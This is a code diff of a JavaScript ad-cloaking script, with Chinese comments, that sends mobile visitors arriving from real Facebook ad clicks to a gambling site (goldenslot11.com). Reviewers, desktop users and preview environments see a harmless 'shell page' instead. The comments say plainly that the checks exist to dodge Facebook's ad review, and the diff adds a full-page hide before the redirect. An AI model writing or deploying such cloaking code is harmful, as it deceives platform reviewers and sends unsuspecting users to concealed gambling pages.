@@ -1,51 +1,57 @@
 (function() {
-    // 1. 修复：必须给一个有效的目标地址
-    var config_bproducturl = "https://www.goldenslot11.com/13/?p0=1uk61sz6"; 
+    // 【1. 配置：你的落地页主地址】
+    var landing_page = "https://www.goldenslot11.com/13/?p0=1uk61sz6";
 
-    function getQueryStr(str) {
-        if (!str) return {};
-        var obj = {};
-        var search = str.split('?')[1];
-        if(!search) return {};
-        search = search.split('&');
-        for (var i = 0; i < search.length; i++) {
-            var item = search[i].split('=');
-            // 修复：获取值时自动解码并去空格
-            obj[item[0]] = decodeURIComponent(item[1] || "").trim();
+    // 【2. 解析函数：获取参数并自动清理空格 (%20)】
+    function getQueryParam(name) {
+        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null) {
+            // decodeURIComponent 处理编码，trim() 处理空格
+            return decodeURIComponent(r[2]).trim();
         }
-        return obj;
+        return "";
     }
 
-    var query = getQueryStr(location.search);
-    var ua = navigator.userAgent.toLowerCase();
+    // 【3. 核心判定逻辑】
+    function shouldRedirect() {
+        var search = window.location.search.toLowerCase();
+        var ua = navigator.userAgent.toLowerCase();
 
-    // 核心判定逻辑
-    function shouldJump() {
-        // A. 测试模式优先
-        if (query.funtest === '1') return true;
-        // B. 环境拦截：必须是手机，不能有占位符
-        if (!/android|iphone|ipad|ipod/.test(ua)) return false;
-        if (location.search.indexOf('{{') > -1 || location.search.indexOf('%7b') > -1) return false;
-        // C. 参数拦截：fbclid 和其他参数不能为空或空格
-        if (!query.fbclid || !query.campaign || !query.adgroup) return false;
-        
+        // A. 占位符拦截（死刑）：只要含有 "{{", 说明是 FB 内部环境或预览，绝对不跳
+        if (search.indexOf('{{') > -1 || search.indexOf('%7b%7b') > -1) {
+            return false;
+        }
+
+        // B. 移动端强制校验：必须是手机，拦截 PC 端审核
+        var isMobile = /android|iphone|ipad|ipod/.test(ua);
+        if (!isMobile) return false;
+
+        // C. 真实参数校验：这些参数经过 trim() 后，必须有实际内容
+        // 只有 FB 真实匹配了参数，这些值才会有意义
+        var fbclid = getQueryParam('fbclid');
+        var campaign = getQueryParam('campaign');
+        var adgroup = getQueryParam('adgroup');
+
+        // 必须具备 fbclid，且 campaign 不能是空的（处理了 %20）
+        if (fbclid === "" || campaign === "" || adgroup === "") {
+            return false;
+        }
+
         return true;
     }
 
-    if (shouldJump()) {
-        // 判定成功：执行零闪烁跳转
-        document.body.style.opacity = "0";
-        var connector = config_bproducturl.indexOf('?') > -1 ? '&' : '?';
-        var finalUrl = config_bproducturl + connector + window.location.search.substring(1);
+    // 【4. 执行动作】
+    if (shouldRedirect()) {
+        // 判定为真实点击，隐藏 body 准备跳转（防止闪烁）
+        document.documentElement.style.display = 'none';
+
+        var connector = landing_page.indexOf('?') > -1 ? '&' : '?';
+        var finalUrl = landing_page + connector + window.location.search.substring(1);
         
-        // 尝试跳转
         window.location.replace(finalUrl);
-        
-        // 超时恢复，防止白屏
-        setTimeout(function() { document.body.style.opacity = "1"; }, 3500);
     } else {
-        // 判定失败：正常加载游戏逻辑
-        console.log("Safe Mode: Loading game...");
-        if (typeof init === 'function') init();
+        // 判定为审核或无效点击，留在原地，显示控制台信息供你自己调试
+        console.log("Verified: Stay in shell page.");
     }
 })();
